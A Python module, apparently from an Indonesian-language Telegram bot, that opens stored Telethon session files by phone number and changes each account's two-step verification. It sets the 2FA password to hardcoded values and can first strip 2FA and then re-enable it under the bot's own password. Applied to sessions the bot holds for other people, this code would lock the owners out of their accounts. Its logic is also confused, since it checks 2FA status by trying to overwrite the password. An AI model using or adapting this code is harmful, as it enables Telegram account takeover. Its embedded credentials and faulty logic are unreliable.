# security.py

import os
from telethon import TelegramClient, errors
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ContextTypes

SESSION_FOLDER = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'login3'))

# Fungsi untuk mengecek status 2FA
async def check_2fa_status(update: Update, context: ContextTypes.DEFAULT_TYPE, phone_number: str):
    query = update.callback_query
    await query.answer()

    session_path = os.path.join(SESSION_FOLDER, f"{phone_number}.session")

    if not os.path.exists(session_path):
        await query.message.reply_text(
            f"❌ Session tidak ditemukan untuk:\n`{phone_number}`",
            parse_mode='Markdown'
        )
        return

    api_id = context.bot_data.get("api_id")
    api_hash = context.bot_data.get("api_hash")

    client = TelegramClient(session_path, api_id, api_hash)
    await client.connect()

    if not await client.is_user_authorized():
        await query.message.reply_text("❌ Akun belum login.")
        await client.disconnect()
        return

    try:
        # Cek apakah 2FA aktif
        try:
            await client.edit_2fa(
                new_password="qwerty1357",  # Coba set password baru untuk mengaktifkan 2FA
                hint="Hint untuk password baru"
            )
            await query.message.reply_text("✅ 2FA sudah aktif, password baru telah diatur.")
            return

        except errors.SessionPasswordNeededError:
            # Jika 2FA aktif, tampilkan tombol untuk mengganti password 2FA
            keyboard = [
                [InlineKeyboardButton("🔐 Ganti 2FA Password", callback_data=f"change_2fa_{phone_number}")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.message.reply_text(
                "ℹ️ 2FA sudah aktif. Jika Anda ingin mengganti password 2FA, tekan tombol di bawah.",
                reply_markup=reply_markup
            )

    except Exception as e:
        await query.message.reply_text(f"❌ Gagal memeriksa 2FA:\n`{e}`", parse_mode='Markdown')
    finally:
        await client.disconnect()

# Fungsi untuk menonaktifkan dan mengganti password 2FA
async def remove_and_set_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE, phone_number: str):
    query = update.callback_query
    await query.answer()

    session_path = os.path.join(SESSION_FOLDER, f"{phone_number}.session")

    if not os.path.exists(session_path):
        await query.message.reply_text(
            f"❌ Session tidak ditemukan untuk:\n`{phone_number}`",
            parse_mode='Markdown'
        )
        return

    api_id = context.bot_data.get("api_id")
    api_hash = context.bot_data.get("api_hash")

    client = TelegramClient(session_path, api_id, api_hash)
    await client.connect()

    if not await client.is_user_authorized():
        await query.message.reply_text("❌ Akun belum login.")
        await client.disconnect()
        return

    try:
        await client.edit_2fa()
        await query.message.reply_text("✅ 2FA berhasil dinonaktifkan.")

        await client.disconnect()  # putuskan koneksi
        await client.connect()     # sambung ulang koneksi

        # Aktifkan kembali 2FA
        await client.edit_2fa(
            new_password="PasswordBaruBanget123!",
            hint="Password baru bot"
        )
        await query.message.reply_text("✅ 2FA berhasil diaktifkan dengan password baru.")

    except Exception as e:
        await query.message.reply_text(f"❌ Gagal mengganti 2FA:\n`{e}`", parse_mode='Markdown')
    finally:
        await client.disconnect()
